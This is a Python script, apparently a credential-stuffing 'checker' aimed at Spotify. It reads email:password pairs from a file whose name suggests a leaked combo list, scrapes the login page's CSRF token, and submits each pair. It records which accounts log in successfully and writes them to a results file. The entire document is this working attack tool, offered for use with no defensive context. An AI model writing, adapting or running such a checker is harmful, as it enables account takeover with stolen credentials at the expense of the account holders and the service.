import requests
import re
from bs4 import BeautifulSoup

def check_spotify_account(email, password):
    login_url = "https://accounts.spotify.com/pt-BR/login"
    session = requests.Session()

    try:
        # Fetch the login page to get CSRF token
        response = session.get(login_url, timeout=10)
        response.raise_for_status()

        soup = BeautifulSoup(response.text, 'html.parser')
        csrf_token_element = soup.find("input", {"name": "csrf_token"})

        if csrf_token_element is None:
            with open("debug.html", "w", encoding="utf-8") as debug_file:
                debug_file.write(response.text)
            return email, password, "Failed to retrieve CSRF token. Debug saved to debug.html"

        csrf_token = csrf_token_element['value']

        # Prepare login payload
        data = {
            "username": email,
            "password": password,
            "csrf_token": csrf_token,
            "remember": "true"
        }
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        }

        # Submit the login form
        login_response = session.post(login_url, data=data, headers=headers, timeout=10)

        # Analyze the response
        if login_response.url != login_url:
            return email, password, "Valid"
        else:
            return email, password, "Invalid credentials"

    except requests.RequestException as e:
        return email, password, f"Request failed: {e}"
    except Exception as e:
        return email, password, f"Error occurred: {e}"

def parse_accounts(file_path):
    accounts = []
    with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
        for line in file:
            match = re.match(r"([^:]+):([^\|]+)", line)
            if match:
                email = match.group(1).strip()
                password = match.group(2).strip()
                accounts.append((email, password))
    return accounts

def main():
    input_file = "22 spo--ti-fy premium @mahdidz34.txt"  # Replace with your file name
    output_file = "spotify_results.txt"

    accounts = parse_accounts(input_file)
    results = []

    for email, password in accounts:
        result = check_spotify_account(email, password)
        results.append(result)
        print(f"Checked {email}: {result[2]}")

    with open(output_file, 'w', encoding='utf-8') as file:
        for email, password, status in results:
            file.write(f"{email}:{password} | Status: {status}\n")

    print(f"Results saved to {output_file}")

if __name__ == "__main__":
    main()
